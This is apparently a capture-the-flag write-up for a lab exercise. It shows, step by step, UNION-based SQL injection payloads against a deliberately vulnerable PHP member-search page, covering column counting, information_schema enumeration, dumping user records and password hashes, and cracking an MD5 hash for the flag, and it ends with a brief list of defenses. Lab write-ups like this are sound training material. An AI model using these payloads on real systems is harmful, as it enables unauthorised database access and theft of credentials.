# Members SQL injection vulnerability

https://owasp.org/www-community/attacks/SQL_Injection

https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/

https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/

## Description

We find and sql injection vulnerability in the member search
our input is directly passed to the query,
means we can add parameters to the WHERE clause
The query must be similar to this:

`$id = isset($_GET['id'])
=> SELECT * FROM members WHERE id = ${input}`

## Attack

### I - Find the number of column with ORDER BY
---

input = "-1 ORDER BY N"

with order by if the number of column is superior it will show and error 
so we go with N = 1 then 2 then 3, and here we get and error

http://192.168.1.75/?page=member&id=1+ORDER+BY+2&Submit=Submit#

ID: 1 ORDER BY 2 
First name: Barack Hussein
Surname : Obama

=> The number of column is 2

### II - Find the vulnerable column with UNION SELECT
---

input = "-1 UNION SELECT 1,2"

http://192.168.1.75/?page=member&id=1+union+select+1%2C2&Submit=Submit#

ID: -1 union select 1,2 
First name: 1
Surname : 2

=> The second column is vulnarable

input = "-1 UNION SELECT 1,version()"

http://192.168.1.75/?page=member&id=1+union+select+1%2Cversion%28%29&Submit=Submit#

ID: -1 union select 1,version() 
First name: 1
Surname : 5.5.44-0ubuntu0.12.04.1

input = "-1 UNION SELECT 1,database()"

ID: -1 UNION SELECT 1,database() 
First name: 1
Surname : Member_Sql_Injection

### III - Find the table name and columns with GROUP_CONCAT() | INFORMATION_SCHEMA() | DATABES()
---

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()) 
Title: list_images
Url : 1

=> Table name = list_images

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE())"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE()) 
First name: 1
Surname : user_id,first_name,last_name,town,country,planet,Commentaire,countersign

### IV - Extract data
---

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(user_id) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(user_id) FROM users) 
First name: 1
Surname : 1,2,3,5

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(first_name) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(first_name) FROM users) 
First name: 1
Surname : Barack Hussein,Adolf,Joseph,Flag

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(last_name) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(last_name) FROM users) 
First name: 1
Surname : Obama,Hitler,Staline,GetThe

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(town) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(town) FROM users) 
First name: 1
Surname : Honolulu ,Berlin,Moscou,42

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(country) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(country) FROM users) 
First name: 1
Surname : America,Allemagne,Russia,42


input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(planet) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(planet) FROM users) 
First name: 1
Surname : EARTH,Earth,Earth,42


input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(countersign) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(countersign) FROM users) 
First name: 1
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9,60e9032c586fb422e2c16dee6286cf10,e083b24a01c483437bcf4a9eea7c1b4d,5ff9d0165b4f92b14994e5c685cdce28

input = "-1 UNION SELECT 1,(SELECT GROUP_CONCAT(Commentaire) FROM users)"

ID: -1 UNION SELECT 1,(SELECT GROUP_CONCAT(Commentaire) FROM users)
First name: 1
Surname : Amerca !,Ich spreche kein Deutsch.,????? ????????????? ?????????,Decrypt this password -> then lower all the char. Sh256 on it and it's good !

### V - Result
---

=> On identifie le user 5, GetTheFlag, 42, 42, 42, 5ff9d0165b4f92b14994e5c685cdce28, Decrypt this password -> then lower all the char. Sh256 on it and it's good !

=> 5ff9d0165b4f92b14994e5c685cdce28 is MD5 encrypted = FortyTwo -> lower all char = fortytwo -> Sh256 = 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

## Defense

Option 1: Use of Prepared Statements (with Parameterized Queries)

Option 2: Use of Properly Constructed Stored Procedures

Option 3: Allow-list Input Validation

Option 4: Escaping All User Supplied Input